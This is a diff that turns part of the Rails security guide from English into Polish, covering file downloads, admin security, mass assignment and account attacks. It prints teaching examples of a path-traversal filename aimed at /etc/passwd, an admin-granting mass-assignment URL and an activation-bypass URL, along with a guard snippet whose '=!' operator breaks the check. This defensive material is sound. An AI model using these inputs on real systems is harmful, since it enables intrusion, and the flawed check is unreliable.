-<div class="paragraph"><p><span style="background-color: #fffcdb;">If your Apache DocumentRoot points to Rails' /public directory, do not put file uploads in it</span>, store files at least one level downwards.</p></div>
-<h3 id="_file_downloads">4.4. File downloads</h3>
-<div class="paragraph"><p>-- <em>Make sure users cannot download arbitrary files.</em></p></div>
-<div class="paragraph"><p>Just as you have to filter file names for uploads, you have to do so for downloads. The send_file() method sends files from the server to the client. If you use a file name, that the user entered, without filtering, any file can be downloaded:</p></div>
+<div class="paragraph"><p>Znaczna niekorzyść synchronicznego przetwarzania wczytywania plików (jak np. plugin attachment_fu może zrobić z obrazami), jest jego <span style="color: #;background-color: fffcdb;">podatność na ataki typu danial-of-service</span>. Atakujący może synchronicznie rozpocząć wysyłanie obrazka z wielu komputerów, co zwiększa obciążenie serwera i może prowadzić do awarii serwera.</p></div>
+<div class="paragraph"><p>Najlepszym rozwiązaniem jest <span style="color: #;background-color: fffcdb;">asynchroniczne przetwarzanie plików (w szczególności obrazków i filmów)</span>: Zapisz plik i ustaw harmonogram przetwarzania żądania w bazie danych. Drugi proces zajmie się przetwarzaniem plików w tle.</p></div>
+<h3 id="_wykonywalny_kod_we_wczytywanych_plikach">3.3. Wykonywalny kod we wczytywanych plikach</h3>
+<div class="paragraph"><p>-- <em>Kod źródłowy we wczytywanych plikach może być wykonywany, gdy umieszczony jest w konkretnych katalogów. Nie należy umieszczać wczytywanych plików w Rails / katalog publiczny, jeżeli jest katalog domowy Apache.</em></p></div>
+<div class="paragraph"><p>Popularny serwer Apache posiada opcję o nazwie DocumentRoot. Jest to katalog domowy strony internetowej. Wszystko w tym drzewie katalogów będzie obsługiwane przez serwer WWW. Jeśli istnieją pliki o określonych rozszerzeniach, kod zostanie wykonany, jeśli przyjdzie żądanie (może wymagać niektórych opcji do ustalenia). Przykładem mogą być pliki PHP i CGI. Teraz pomyśl o sytuacji, gdy atakujący wysyła na serwer plik "file.cgi" zawierający kod, który zostanie wykonany, gdy ktoś pobiera plik.</p></div>
+<div class="paragraph"><p><span style="background-color: #fffcdb;">Jeśli DocumentRoot w Apache odnosi się do katalogu Rails' /public directory, nie umieszczaj w nim wczytywanych plików</span>, przechowuj pliki co najmniej jeden poziom niżej.</p></div>
+<h3 id="_ci_ganie_plik_w">3.4. Ściąganie plików</h3>
+<div class="paragraph"><p>-- <em>Upewnij się, czy użytkownicy nie mogą pobierać dowolnych plików.</em></p></div>
+<div class="paragraph"><p>Tak ja to było przy wysyłaniu plików na serwer, musisz filtrować nazwy plików przy pobieraniu. Metoda send_file() wysyła pliki z serwera do klienta. Jeśli używana jest nazwa pliku wpisywana użytkownika, bez filtrowania, można pobrać każdy plik:</p></div>
 <div class="listingblock">
 <div class="content"><!-- Generator: GNU source-highlight 2.11
 by Lorenzo Bettini
 http://www.lorenzobettini.it
 http://www.gnu.org/software/src-highlite -->
 <pre><tt>send_file<span style="color: #990000">(</span><span style="color: #FF0000">'/var/www/uploads/'</span> <span style="color: #990000">+</span> params<span style="color: #990000">[:</span>filename<span style="color: #990000">])</span></tt></pre></div></div>
-<div class="paragraph"><p>Simply pass a file name like “../../../etc/passwd” to download the server&#8217;s login information. A simple solution against this, is to <span style="background-color: #fffcdb;">check that the requested file is in the expected directory</span>:</p></div>
+<div class="paragraph"><p>Wystarczy podać nazwę pliku, taką jak "../../../etc/passwd" żeby pobrać dane do logowania serwera. Prostym rozwiązaniem jest <span style="color: #;background-color: fffcdb;">sprawdzenie czy żądany plik znajduje się w tym katalogu, w którym się spodziewasz</span>:</p></div>
 <div class="listingblock">
 <div class="content"><!-- Generator: GNU source-highlight 2.11
 by Lorenzo Bettini
@@ -561,44 +553,44 @@ filename <span style="color: #990000">=</span> File<span style="color: #990000">
 <span style="font-weight: bold"><span style="color: #0000FF">raise</span></span> <span style="font-weight: bold"><span style="color: #0000FF">if</span></span> basename <span style="color: #990000">=!</span>
      File<span style="color: #990000">.</span>expand_path<span style="color: #990000">(</span>File<span style="color: #990000">.</span>join<span style="color: #990000">(</span>File<span style="color: #990000">.</span>dirname<span style="color: #990000">(</span>filename<span style="color: #990000">),</span> <span style="color: #FF0000">'../../../'</span><span style="color: #990000">))</span>
 send_file filename<span style="color: #990000">,</span> <span style="color: #990000">:</span>disposition <span style="color: #990000">=&gt;</span> <span style="color: #FF0000">'inline'</span></tt></pre></div></div>
-<div class="paragraph"><p>Another (additional) approach is to store the file names in the database and name the files on the disk after the ids in the database. This is also a good approach to avoid possible code in an uploaded file to be executed. The attachment_fu plugin does this in a similar way.</p></div>
+<div class="paragraph"><p>Inny (dodatkowy) sposób to przechowywanie nazw plików w bazie danych i nazywanie plików na dysku według identyfikatorów w bazie danych. Jest to również dobry sposób, żeby uniknąć problemu kodu w nazwach wysyłanych plików. Wtyczka attachment_fu działa w podobny sposób.</p></div>
 </div>
-<h2 id="_intranet_and_admin_security">5. Intranet and Admin security</h2>
+<h2 id="_ochrona_intranetu_i_nardz_dzi_administracyjnych">4. Ochrona Intranetu I nardzędzi administracyjnych</h2>
 <div class="sectionbody">
-<div class="paragraph"><p>-- <em>Intranet and administration interfaces are popular attack targets, because they allow privileged access. Although this would require several extra-security measures, the opposite is the case in the real world.</em></p></div>
-<div class="paragraph"><p>In 2007 there was the first tailor-made <a href="http://www.symantec.com/enterprise/security_response/weblog/2007/08/a_monster_trojan.html">Trojan</a> which stole information from an Intranet, namely the "Monster for employers" web site of Monster.com, an online recruitment web application. Tailor-made Trojans are very rare, so far, and the risk is quite low, but it is certainly a possibility and an example of how the security of the client host is important, too. However, the highest threat to Intranet and Admin applications are XSS and CSRF. </p></div>
-<div class="paragraph"><p><strong>XSS</strong>  If your application re-displays malicious user input from the extranet, the application will be vulnerable to XSS. User names, comments, spam reports, order addresses are just a few uncommon examples, where there can be XSS.</p></div>
-<div class="paragraph"><p>Having one single place in the admin interface or Intranet where the input has not been sanitized, makes the entire application vulnerable. Possible exploits include stealing the privileged administrator&#8217;s cookie, injecting an iframe to steal the administrator&#8217;s password or installing malicious software through browser security holes to take over the administrator&#8217;s computer.</p></div>
-<div class="paragraph"><p>Refer to the Injection section for countermeasures against XSS. It is <span style="background-color: #fffcdb;">recommended to use the SafeErb plugin</span> also in an Intranet or administration interface.</p></div>
-<div class="paragraph"><p><strong>CSRF</strong>  Cross-Site Reference Forgery (CSRF) is a giant attack method, it allows the attacker to do everything the administrator or Intranet user may do. As you have already seen above how CSRF works, here are a few examples of what attackers can do in the Intranet or admin interface.</p></div>
-<div class="paragraph"><p>A real-world example is a <a href="http://www.symantec.com/enterprise/security_response/weblog/2008/01/driveby_pharming_in_the_ wild.html">router reconfiguration by CSRF</a>. The attackers sent a malicious e-mail, with CSRF in it, to Mexican users. The e-mail claimed there was an e-card waiting for them, but it also contained an image tag that resulted in a HTTP-GET request to reconfigure the user&#8217;s router (which is a popular model in Mexico). The request changed the DNS-settings so that requests to a Mexico-based banking site would be mapped to the attacker&#8217;s site. Everyone who accessed the banking site through that router saw the attacker&#8217;s fake web site and had his credentials stolen.</p></div>
-<div class="paragraph"><p>Another example changed Google Adsense&#8217;s e-mail address and password by <a href="http://www.0x000000.com/index.php?i=213&amp;bin=11010101">CSRF</a>. If the victim was logged into Google Adsense, the administration interface for Google advertisements campaigns, an attacker could change his credentials. </p></div>
-<div class="paragraph"><p>Another popular attack is to spam your web application, your blog or forum to propagate malicious XSS. Of course, the attacker has to know the URL structure, but most Rails URLs are quite straightforward or they will be easy to find out, if it is an open-source application&#8217;s admin interface. The attacker may even do 1,000 lucky guesses by just including malicious IMG-tags which try every possible combination.</p></div>
-<div class="paragraph"><p>For <span style="background-color: #fffcdb;">countermeasures against CSRF in administration interfaces and Intranet applications, refer to the countermeasures in the CSRF section</span>.</p></div>
-<h3 id="_additional_precautions">5.1. Additional precautions</h3>
-<div class="paragraph"><p>The common admin interface works like this: it&#8217;s located at www.example.com/admin, may be accessed only if the admin flag is set in the User model, re-displays user input and allows the admin to delete/add/edit whatever data desired. Here are some thoughts about this:</p></div>
+<div class="paragraph"><p>-- <em>Intranet i interfejsy administracyjne są popularnymi celami ataku, ponieważ umożliwiają one uprzywilejowany dostęp. Mimo to wymagają kilku dodatkowych środków bezpieczeństwa, odwrotnie jest w rzeczywistym świecie.</em></p></div>
+<div class="paragraph"><p>W 2007 roku pojawił się pierwszy, wykonany na zamówienie <a href="http://www.symantec.com/enterprise/security_response/weblog/2007/08/a_monster_trojan.html">http://www.symantec.com/enterprise/security_response/weblog/2007/08/a_monster_trojan.html</a> [Trojan], który ukradł informacje z Intranetu, czyli "Potwór dla pracodawców” strony internetowej Monster.com – strony do rekrutacji online. Indywidualnie stworzone Trojany są bardzo rzadkie, jak dotąd, a ryzyko ich użycia przeciw aplikacjom jest dość niskie, ale jest taka możliwość i jest to też przykład jak bezpieczeństwo hosta klienta jest ważne. Jednak najwyższe zagrożenie dla Intranetu i panelów Administracyjnych pochodzi z XSS i CSRF.  </p></div>
+<div class="paragraph"><p><strong>XSS</strong>  Jeśli aplikacja ponownie wyświetla dane wejściowe złośliwego użytkownika z ekstranetu, aplikacja będzie podatny na XSS. Nazwy użytkowników, komentarze, spam raporty, adresy kolejności – to tylko kilka przykładów, które można zaatakować przez XSS.</p></div>
+<div class="paragraph"><p>Nawet jedno miejsce w interfejsie administratora lub Intranecie, w którym dane wejściowe nie zostały sprawdzone, sprawia, że cała aplikacja staje się wrażliwa na atak. Atakującemu umożliwia to kradzież uprzywilejowanych cookies administratora, wstawianie kodu IFRAME, żeby wykraść hasła administratora lub instalowanie złośliwego oprogramowania poprzez luki w zabezpieczeniach przeglądarki w celach przejęcia kontroli nad komputerem administratora.</p></div>
+<div class="paragraph"><p>Zapoznaj się z sekcją o atakach i ochronie przed XSS. <span style="color: #;background-color: fffcdb;">Zalecane jest korzystanie z wtyczki SafeErb</span> również w intranecie lub interfejsie administratora.</p></div>
+<div class="paragraph"><p><strong>CSRF</strong>  Cross-Site Reference Forgery (CSRF) jest bardzo groźną metodą ataku. Pozwala ona atakującemu zrobić dokładnie to samo, co administrator lub użytkownik intranetu. Wcześniej dowiedziałeś się jak działa CSRF, a teraz czas na kilka przykładów:</p></div>
+<div class="paragraph"><p>W świecie rzeczywistym przykładem jest <a href="http://www.symantec.com/enterprise/security_response/weblog/2008/01/driveby_pharming_in_the_ wild.html">rekonfiguracja routera przez CSRF</a>. Atakujący rozesłał złośliwe maile z CSRF do meksykańskich użytkowników. E-mail informował o e-kartce czekającej na użytkowników, ale zawierał również Tag obrazka, które poprzez żądanie http-GET miał rekonfigurować router użytkownika (który jest popularnym modelem w Meksyku). Żądanie zmieniało ustawienia DNS w ten sposób, że żądania wysyłane do Meksykańskiego banku były mapowane do witryny atakującego. Każdy, kto odwiedził witrynę banku za pośrednictwem tego routera trafiał do fałszywej strony atakującego, a jego listy uwierzytelniające zostały skradzione.</p></div>
+<div class="paragraph"><p>Inny przykład zmieniał e-mail i hasło do Google Adsense przez <a href="http://www.0x000000.com/index.php?i=213&amp;bin=11010101">http://www.0x000000.com/index.php?i=213&amp;bin=11010101</a> [CSRF]. Jeżeli ofiara była zalogowana do programu Google Adsense, interfejsu administracyjnego kampanii reklamowych Google, atakujący mógł zmienić jego listy uwierzytelniające.  </p></div>
+<div class="paragraph"><p>Innym popularnym atakiem jest spamowanie twojej strony, bloga lub forum, w celu rozprzestrzenienia złośliwego XSS. Oczywiście, osoba atakująca musi znać strukturę URL, ale większość tych wykorzystywanych przez Railsy jest dość prosta, lub łatwa do odgadnięcia, jeśli jest to jeden z open sourcowych interfejsów administracyjnych. Atakujący może zrobić nawet do 1000 szczęśliwych trafów zawierając złośliwe IMG-tagi które próbują każdej możliwej kombinacji.</p></div>
+<div class="paragraph"><p>Informacje o <span style="color: #;background-color: fffcdb;">ochronie przeciwko CSRF w interfejsach administracyjnych i aplikacjach intranetowych, znajdują się w dziale o ochronie przeciw CSRF</span>.</p></div>
+<h3 id="_dodatkowe_rodki_ostro_no_ci">4.1. Dodatkowe środki ostrożności</h3>
+<div class="paragraph"><p>Przeciętny interfejs administracyjny działa tak: jest umieszczony w www.example.com/admin, może być dostępny tylko wtedy, gdy flaga administratora jest ustawiona w modelu użytkownika, ponownie wyświetla wejście użytkownika i pozwala adminowi usuwać/dodawać/edytować wszysto, na co ma ochotę. Oto kilka słów na ten temat:</p></div>
 <div class="ulist"><ul>
 <li>
 <p>
-It is very important to <span style="background-color: #fffcdb;">think about the worst case</span>: What if someone really got hold of my cookie or user credentials. You could <span style="background-color: #fffcdb;">introduce roles</span> for the admin interface to limit the possibilities of the attacker. Or how about <span style="background-color: #fffcdb;">special login credentials</span> for the admin interface, other than the ones used for the public part of the application. Or a <span style="background-color: #fffcdb;">special password for very serious actions</span>?
+Bardzo ważne jest, <span style="color: #;background-color: fffcdb;">żeby myśleć o najgorszym przypadku</span>: Co zrobić, jeśli ktoś naprawdę przejmie moje pliki cookie lub poświadczenia użytkownika. Można <span style="color: #;background-color: fffcdb;">wprowadzić role</span> dla interfejsu administratora, aby ograniczyć możliwości atakującego. A może <span style="color: #;background-color: fffcdb;">specjalne poświadczenie logowania</span> do interfejsu administratora, inne niż te używane do publicznej części aplikacji. Lub <span style="color: #;background-color: fffcdb;">specjalne hasło do bardzo poważnych działań</span>?
 </p>
 </li>
 <li>
 <p>
-Does the admin really have to access the interface from everywhere in the world? Think about <span style="background-color: #fffcdb;">limiting the login to a bunch of source IP addresses</span>. Examine request.remote_ip to find out about the user&#8217;s IP address. This is not bullet-proof, but a great barrier. Remember that there might be a proxy in use, though.
+Czy admin naprawdę ma dostęp do interfejsu z każdego miejsca na świecie? Pomyśl o <span style="color: #;background-color: fffcdb;">ograniczeniu logowania na kilka adresów IP</span>. Zbadaj request.remote_ip, aby dowiedzieć się o adresach IP użytkowników. Nie gwarantuje to stu procentowej ochrony, ale na pewno stanowi dużą przeszkodę. Pamiętaj, że ktoś może używać serwera Proxy.
 </p>
 </li>
 <li>
 <p>
-<span style="background-color: #fffcdb;">Put the admin interface to a special sub-domain</span> such as admin.application.com and make it a separate application with its own user management. This makes stealing an admin cookie from the usual domain, www.application.com, impossible. This is because of the same origin policy in your browser: An injected (XSS) script on www.application.com may not read the cookie for admin.application.com and vice-versa.
+<span style="color: #;background-color: Fffcdb;">Umieść specjalny interfejs administracyjny w sub-domenie</span> takiej jak admin.application.com i stwórz z niej odrębną aplikację, z własnym zarządzaniem uzytkownikami. To sprawia, że kradzież cookie admina ze zwykłej domenie www.application.com jest niemożliwa. Wynika to z konceptu „same origin Policy” w przeglądarce: skrypt (XSS) wstawiony na stronie www.application.com nie może odczytać cookie z admin.application.com i vice versa.
 </p>
 </li>
 </ul></div>
 </div>
-<h2 id="_mass_assignment">6. Mass assignment</h2>
+<h2 id="_masowe_przypisanie">5. Masowe przypisanie</h2>
 <div class="sectionbody">
-<div class="paragraph"><p>-- <em>Without any precautions Model.new(params[:model]) allows attackers to set any database column&#8217;s value.</em></p></div>
-<div class="paragraph"><p>The mass-assignment feature may become a problem, as it allows an attacker to set any model&#8217;s attribute by manipulating the hash passed to a model&#8217;s new() method:</p></div>
+<div class="paragraph"><p>-- <em>Bez zachowania środków ostrożności Model.new(params[:model]) pozwala atakującemu na ustawienie wartości każdej kolumnie w bazie danych.</em></p></div>
+<div class="paragraph"><p>Masowe przypisanie może stać się problemem, ponieważ umożliwia atakującemu ustawienie atrybutów każdego modelu poprzez manipulację hash przekazanego do metody nowego modelu():</p></div>
 <div class="listingblock">
 <div class="content"><!-- Generator: GNU source-highlight 2.11
 by Lorenzo Bettini
@@ -608,35 +600,35 @@ http://www.gnu.org/software/src-highlite -->
   params<span style="color: #990000">[:</span>user<span style="color: #990000">]</span> <span style="font-style: italic"><span style="color: #9A1900">#=&gt; {:name =&gt; “ow3ned”, :admin =&gt; true}</span></span>
   <span style="color: #009900">@user</span> <span style="color: #990000">=</span> User<span style="color: #990000">.</span>new<span style="color: #990000">(</span>params<span style="color: #990000">[:</span>user<span style="color: #990000">])</span>
 <span style="font-weight: bold"><span style="color: #0000FF">end</span></span></tt></pre></div></div>
-<div class="paragraph"><p>Mass-assignment saves you much work, because you don&#8217;t have to set each value individually. Simply pass a hash to the new() method, or assign attributes=(attributes) a hash value, to set the model&#8217;s attributes to the values in the hash. The problem is that it is often used in conjunction with the parameters (params) hash available in the controller, which may be manipulated by an attacker. He may do so by changing the URL like this:</p></div>
+<div class="paragraph"><p>Masowe przypisanie może zaoszczędzić ciężkiej pracy, ponieważ nie musisz ustawiać wszystkich wartości indywidualni. Wystarczy przekazać hash do metody new() lub przypisać atrybuty=(atrybuty) wartość hash, aby ustawić atrybuty modelu do wartości w hashu. Problemem jest, że jest to często używane w połączeniu z parametrami (params) hasha dostępnego w kontrolerze, który może być manipulowany przez atakującego. Może to zrobić poprzez zmianę adresu URL w taki sposób:</p></div>
 <div class="literalblock">
 <div class="content">
 <pre><tt>http://www.example.com/user/signup?user[name]=ow3ned&amp;user[admin]=1</tt></pre>
 </div></div>
-<div class="paragraph"><p>This will set the following parameters in the controller:</p></div>
+<div class="paragraph"><p>Pozwoli to ustalić następujące parametry w kontrolerze:</p></div>
 <div class="listingblock">
 <div class="content"><!-- Generator: GNU source-highlight 2.11
 by Lorenzo Bettini
 http://www.lorenzobettini.it
 http://www.gnu.org/software/src-highlite -->
 <pre><tt>params<span style="color: #990000">[:</span>user<span style="color: #990000">]</span> <span style="font-style: italic"><span style="color: #9A1900">#=&gt; {:name =&gt; “ow3ned”, :admin =&gt; true}</span></span></tt></pre></div></div>
-<div class="paragraph"><p>So if you create a new user using mass-assignment, it may be too easy to become an administrator.</p></div>
-<h3 id="_countermeasures">6.1. Countermeasures</h3>
-<div class="paragraph"><p>To avoid this, Rails provides two class methods in your ActiveRecord class to control access to your attributes. The attr_protected method takes a list of attributes that will not be accessible for mass-assignment. For example:</p></div>
+<div class="paragraph"><p>Więc tworząc nowego użytkownika za pomocą masowego przypisania, w prosty sposób można stać się administratorem.</p></div>
+<h3 id="_sposoby_ochrony">5.1. Sposoby ochrony</h3>
+<div class="paragraph"><p>Aby tego uniknąć, Railsy oferują dwie klasowe metody w klasie ActiveRecord do kontroli dostępu do atrybutów. Metoda attr_protected stanowi listę atrybutów, które nie będą dostępne dla masowego przypisania. Na przykład:</p></div>
 <div class="listingblock">
 <div class="content"><!-- Generator: GNU source-highlight 2.11
 by Lorenzo Bettini
 http://www.lorenzobettini.it
 http://www.gnu.org/software/src-highlite -->
 <pre><tt>attr_protected <span style="color: #990000">:</span>admin</tt></pre></div></div>
-<div class="paragraph"><p>A much better way, because it follows the whitelist-principle, is the <span style="background-color: #fffcdb;">attr_accessible method</span>. It is the exact opposite of attr_protected, because <span style="background-color: #fffcdb;">it takes a list of attributes that will be accessible</span>. All other attributes will be protected. This way you won&#8217;t forget to protect attributes when adding new ones in the course of development. Here is an example:</p></div>
+<div class="paragraph"><p>O wiele lepsze rozwiązanie, kierujące się zasadą białej listy to <span style="color: #;background-color: fffcdb;">metoda attr_accessible</span>. Jest dokładne naprzeciwieństwo attr_protected, ponieważ <span style="color: #;background-color: fffcdb;">dotyczy listy atrybutów, które będą dostępne</span>. Wszystkie inne atrybuty będą chronione. W ten sposób nigdy nie zapomnisz o ochronie atrybutów podczas ich dodawania nowych w trakcie rozwoju. Oto przykład:</p></div>
 <div class="listingblock">
 <div class="content"><!-- Generator: GNU source-highlight 2.11
 by Lorenzo Bettini
 http://www.lorenzobettini.it
 http://www.gnu.org/software/src-highlite -->
 <pre><tt>attr_accessible <span style="color: #990000">:</span>name</tt></pre></div></div>
-<div class="paragraph"><p>If you want to set a protected attribute, you will to have to assign it individually:</p></div>
+<div class="paragraph"><p>Jeśli chcesz ustawić atrybut chroniony, będziesz musiał przypisać go indywidualnie:</p></div>
 <div class="listingblock">
 <div class="content"><!-- Generator: GNU source-highlight 2.11
 by Lorenzo Bettini
@@ -648,105 +640,105 @@ http://www.gnu.org/software/src-highlite -->
 <span style="color: #009900">@user</span><span style="color: #990000">.</span>admin <span style="color: #990000">=</span> <span style="font-weight: bold"><span style="color: #0000FF">true</span></span>
 <span style="color: #009900">@user</span><span style="color: #990000">.</span>admin <span style="font-style: italic"><span style="color: #9A1900">#=&gt; true</span></span></tt></pre></div></div>
 </div>
-<h2 id="_user_management">7. User management</h2>
+<h2 id="_zarz_dzanie_u_ytkownikami">6. Zarządzanie użytkownikami</h2>
 <div class="sectionbody">
-<div class="paragraph"><p>-- <em>Almost every web application has to deal with authorization and authentication. Instead of rolling your own, it is advisable to use common plug-ins. But keep them up-to-date, too. A few additional precautions can make your application even more secure.</em></p></div>
-<div class="paragraph"><p>There are some authorization and authentication plug-ins for Rails available. A good one saves only encrypted passwords, not plain-text passwords. The most popular plug-in is <span style="background-color: #fffcdb;">restful_authentication</span> which protects from session fixation, too. However, earlier versions allowed you to login without user name and password in certain circumstances.</p></div>
-<div class="paragraph"><p>Every new user gets an activation code to activate his account when he gets an e-mail with a link in it. After activating the account, the activation_code columns will be set to NULL in the database. If someone requested an URL like these, he would be logged in as the first activated user found in the database (and chances are that this is the administrator):</p></div>
+<div class="paragraph"><p>-- <em>Prawie każda aplikacja internetowa ma do czynienia z uwierzytelnianiem i autoryzacją. Zamiast kroczenia własną drogą, wskazane jest stosowanie typowych wtyczek (pluginów). Ale ważne jest, aby je aktualizować. Kilka dodatkowych środków ostrożności sprawi, że twoja aplikacja będzie jeszcze bezpieczniejsza.</em></p></div>
+<div class="paragraph"><p>Istnieje kilka wtyczek obsługujących uwierzytelnianie i autoryzację, dostępnych w Railsach. Te lepsze zapisują tylko zaszyfrowane hasła, a nie te czysto tekstowe. Najbardziej popularną wtyczką jest <span style="color: #;background-color: fffcdb;">restful_authentication</span>, która chroni również przed atakami typu session fixation. Jednak wcześniejsze wersje dopuszczały do logowanie bez nazwy użytkownika i hasła w niektórych okolicznościach.</p></div>
+<div class="paragraph"><p>Każdy nowy użytkownik otrzymuje kod aktywacyjny, aby aktywować swoje konto. Link do aktywacji wysyłany jest w mailu. Po aktywacji konta, kolumna activation_code w bazie danych będzie ustawiona na NULL. Jeśli ktoś wyśle żądanie o taki URL, będzie zalogowany jako pierwszy aktywowany użytkownika, jakiego można znaleźć w bazie danych (i są szanse, że będzie to administrator):</p></div>
 <div class="literalblock">
 <div class="content">
 <pre><tt>http://localhost:3006/user/activate
 http://localhost:3006/user/activate?id=</tt></pre>
 </div></div>
-<div class="paragraph"><p>This is possible because on some servers, this way the parameter id, as in params[:id], would be nil. However, here is the finder from the activation action:</p></div>
+<div class="paragraph"><p>Jest to możliwe, gdyż na niektórych serwerach parametr id, tak jak w params[:id], miałby wartość nil. Jednakże, oto wyszukiwarka z akcji aktywacji:</p></div>
 <div class="listingblock">
 <div class="content"><!-- Generator: GNU source-highlight 2.11
 by Lorenzo Bettini
 http://www.lorenzobettini.it
 http://www.gnu.org/software/src-highlite -->
 <pre><tt>User<span style="color: #990000">.</span>find_by_activation_code<span style="color: #990000">(</span>params<span style="color: #990000">[:</span>id<span style="color: #990000">])</span></tt></pre></div></div>
-<div class="paragraph"><p>If the parameter was nil, the resulting SQL query will be</p></div>
+<div class="paragraph"><p>Jeśli parametr miałby wartość nil, wynikające zapytanie SQL będzie takie:</p></div>
 <div class="literalblock">
 <div class="content">
 <pre><tt>SELECT * FROM users WHERE (users.`activation_code` IS NULL) LIMIT 1</tt></pre>
 </div></div>
-<div class="paragraph"><p>And thus it found the first user in the database, returned it and logged him in. You can find out more about it in <a href="http://www.rorsecurity.info/2007/10/28/restful_authentication-login-security/">my blog post</a>. <span style="background-color: #fffcdb;">It is advisable to update your plug-ins from time to time</span>. Moreover, you can review your application to find more flaws like this.</p></div>
-<h3 id="_brute_forcing_accounts">7.1. Brute-forcing accounts</h3>
-<div class="paragraph"><p>-- <em>Brute-force attacks on accounts are trial and error attacks on the login credentials. Fend them off with more generic error messages and possibly require to enter a CAPTCHA.</em></p></div>
-<div class="paragraph"><p>A list of user names for your web application may be misused to brute-force the corresponding passwords, because most people don&#8217;t use sophisticated passwords. Most passwords are a combination of dictionary words and possibly numbers. So armed with a list of user name&#8217;s and a dictionary, an automatic program may find the correct password in a matter of minutes.</p></div>
-<div class="paragraph"><p>Because of this, most web applications will display a generic error message “user name or password not correct”, if one of these are not correct. If it said “the user name you entered has not been found”, an attacker could automatically compile a list of user names.</p></div>
-<div class="paragraph"><p>However, what most web application designers neglect, are the forgot-password pages. These pages often admit that the entered user name or e-mail address has (not) been found. This allows an attacker to compile a list of user names and brute-force the accounts.</p></div>
-<div class="paragraph"><p>In order to mitigate such attacks, <span style="background-color: #fffcdb;">display a generic error message on forgot-password pages, too</span>. Moreover, you can <span style="background-color: #fffcdb;">require to enter a CAPTCHA after a number of failed logins from a certain IP address</span>. Note, however, that this is not a bullet-proof solution against automatic programs, because these programs may change their IP address exactly as often. However, it raises the barrier of an attack.</p></div>
-<h3 id="_account_hijacking">7.2. Account hijacking</h3>
-<div class="paragraph"><p>-- <em>Many web applications make it easy to hijack user accounts. Why not be different and make it more difficult?</em></p></div>
-<h4 id="_passwords">7.2.1. Passwords</h4>
-<div class="paragraph"><p>Think of a situation where an attacker has stolen a user&#8217;s session cookie and thus may co-use the application. If it is easy to change the password, the attacker will hijack the account with a few clicks. Or if the change-password form is vulnerable to CSRF, the attacker will be able to change the victim&#8217;s password by luring him to a web page where there is a crafted IMG-tag which does the CSRF. As a countermeasure, <span style="background-color: #fffcdb;">make change-password forms safe against CSRF</span>, of course. And <span style="background-color: #fffcdb;">require the user to enter the old password when changing it</span>.</p></div>
-<h4 id="_e_mail">7.2.2. E-Mail</h4>
-<div class="paragraph"><p>However, the attacker may also take over the account by changing the e-mail address. After he changed it, he will go to the forgotten-password page and the (possibly new) password will be mailed to the attacker&#8217;s e-mail address. As a countermeasure <span style="background-color: #fffcdb;">require the user to enter the password when changing the e-mail address, too</span>.</p></div>
-<h4 id="_other">7.2.3. Other</h4>
-<div class="paragraph"><p>Depending on your web application, there may be more ways to hijack the user&#8217;s account. In many cases CSRF and XSS will help to do so. For example, as in a CSRF vulnerability in <a href="http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/">Google Mail</a>. In this proof-of-concept attack, the victim would have been lured to a web site controlled by the attacker. On that site is a crafted IMG-tag which results in a HTTP GET request that changes the filter settings of Google Mail. If the victim was logged in to Google Mail, the attacker would change the filters to forward all e-mails to his e-mail address. This is nearly as harmful as hijacking the entire account. As a countermeasure, <span style="background-color: #fffcdb;">review your application logic and eliminate all XSS and CSRF vulnerabilities</span>.</p></div>
-<h3 id="_captchas">7.3. CAPTCHAs</h3>
-<div class="paragraph"><p>-- <em>A CAPTCHA is a challenge-response test to determine that the response is not generated by a computer. It is often used to protect comment forms from automatic spam bots by asking the user to type the letters of a distorted image. The idea of a negative CAPTCHA is not to ask a user to proof that he is human, but reveal that a robot is a robot.</em></p></div>
-<div class="paragraph"><p>But not only spam robots (bots) are a problem, but also automatic login bots. A popular CAPTCHA API is <a href="http://recaptcha.net/">reCAPTCHA</a> which displays two distorted images of words from old books. It also adds an angled line, rather than a distorted background and high levels of warping on the text as earlier CAPTCHAs did, because the latter were broken. As a bonus, using reCAPTCHA helps to digitize old books. <a href="http://ambethia.com/recaptcha/">ReCAPTCHA</a> is also a Rails plug-in with the same name as the API.</p></div>
-<div class="paragraph"><p>You will get two keys from the API, a public and a private key, which you have to put into your Rails environment. After that you can use the recaptcha_tags method in the view, and the verify_recaptcha method in the controller. Verify_recaptcha will return false if the validation fails.
-The problem with CAPTCHAs is, they are annoying. Additionally, some visually impaired users have found certain kinds of distorted CAPTCHAs difficult to read. The idea of negative CAPTCHAs is not to ask a user to proof that he is human, but reveal that a spam robot is a bot.</p></div>
-<div class="paragraph"><p>Most bots are really dumb, they crawl the web and put their spam into every form&#8217;s field they can find. Negative CAPTCHAs take advantage of that and include a "honeypot" field in the form which will be hidden from the human user by CSS or JavaScript.</p></div>
-<div class="paragraph"><p>Here are some ideas how to hide honeypot fields by JavaScript and/or CSS:</p></div>
+<div class="paragraph"><p>I tak wyszukiwarka znalazła pierwszego użytkownika w bazie danych, zwróciła go i został zalogowany. Więcej możesz przeczytać na <a href="http://www.rorsecurity.info/2007/10/28/restful_authentication-login-security/">moim blogu</a>. <span style="color: #;background-color: fffcdb;">Od czasu do czasu Powinieneś aktualizować swoje wtyczki</span>. Ponadto możesz przeglądnąć swoją aplikację, żeby znaleźć więcej takich wad.</p></div>
+<h3 id="_ataki_typu_brute_force_na_konta_u_ytkownik_w">6.1. Ataki typu brute-force na konta użytkowników</h3>
+<div class="paragraph"><p>-- <em>Ataki typu brute-force na dane logowania użytkowników są robione metodą prób i błędów. Możesz odpierać je stosując bardziej ogólne komunikaty o błędach i ewentualnie wymagać wprowadzania CAPTCHA.</em></p></div>
+<div class="paragraph"><p>Lista nazw użytkowników dla aplikacji internetowej może być wykorzystana do ataku typu brute-force na odpowiadające hasła, ponieważ większość ludzi nie używa wyszukanych haseł. Większość haseł stanowi połączenie wyrazów ze słownika i ewentualnie numerów. Uzbrojony w listę nazw użytkowników i w słownik, automatyczny program może znaleźć odpowiednie hasło w ciągu kilku minut.</p></div>
+<div class="paragraph"><p>Z tego powodu, większość aplikacji internetowych wyświetli ogólny komunikat o błędzie "Błędna nazwa użytkownika lub hasło", jeśli jedna z nich nie jest poprawna. Jeśli komunikat brzmi: "Wpisana nazwa użytkownika nie została znaleziona", atakujący mógłby automatycznie sporządzić listę nazw użytkowników.</p></div>
